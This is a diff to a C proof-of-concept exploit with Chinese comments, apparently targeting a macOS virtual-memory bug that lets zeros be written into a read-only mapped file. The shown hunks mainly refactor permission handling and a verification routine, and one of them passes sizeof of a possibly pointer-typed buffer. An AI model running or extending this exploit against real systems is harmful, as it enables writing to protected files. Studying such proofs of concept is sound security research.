@@ -62,6 +62,14 @@
 #include <mach/mach.h>
 #include <string.h>
 #include <stdbool.h>
+#include <errno.h>
+#include <sys/stat.h>
+
+// 添加在包含文件之后，函数定义之前
+// 定义安全的chmod包装函数
+static inline int safe_chmod(const char *path, int mode) {
+    return chmod(path, (mode_t)mode);
+}
 
 // 定义常量
 #define PAGE_SIZE 4096
@@ -89,7 +97,7 @@ void* map_file_page_ro(const char* path) {
 }
 
 // 验证文件内容是否被修改
-bool verify_changes(const char* path, const char* original_content) {
+static bool verify_changes(const char* path, const unsigned char* original_content, size_t content_size) {
   int fd = open(path, O_RDONLY);
   if (fd == -1) {
     printf("[-] 验证时无法打开文件\n");
@@ -107,7 +115,7 @@ bool verify_changes(const char* path, const char* original_content) {
 
   // 检查是否有零字节被写入
   bool has_zeros = false;
-  for (int i = 0; i < bytes_read && i < 128; i++) {
+  for (int i = 0; i < bytes_read && i < content_size; i++) {
     if (buffer[i] == 0 && original_content[i] != 0) {
       has_zeros = true;
       break;
@@ -166,7 +174,7 @@ int exploit_vm_behavior(const char *path) {
   printf("[+] 成功解除映射，已触发漏洞\n");
   
   // 5. 验证文件是否被修改
-  if (verify_changes(path, original_content)) {
+  if (verify_changes(path, (unsigned char*)original_content, sizeof(original_content))) {
     printf("[+] 漏洞利用成功：文件内容已被修改\n");
     return EXPLOIT_SUCCESS;
   } else {
@@ -205,7 +213,7 @@ char* create_test_file(const char* filename) {
   fclose(f);
   
   // 设置只读权限
-  if (chmod(full_path, 0444) != 0) {
+  if (safe_chmod(full_path, S_IRUSR | S_IRGRP | S_IROTH) != 0) {
     printf("[-] 无法设置文件权限为只读\n");
     free(full_path);
     return NULL;
@@ -241,7 +249,7 @@ int main(int argc, char** argv) {
   // 清理
   if (test_file_path) {
     // 恢复文件权限以便删除
-    chmod(test_file_path, 0644);
+    safe_chmod(test_file_path, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
     // 删除测试文件
     if (unlink(test_file_path) == 0) {
       printf("[+] 已删除测试文件\n");
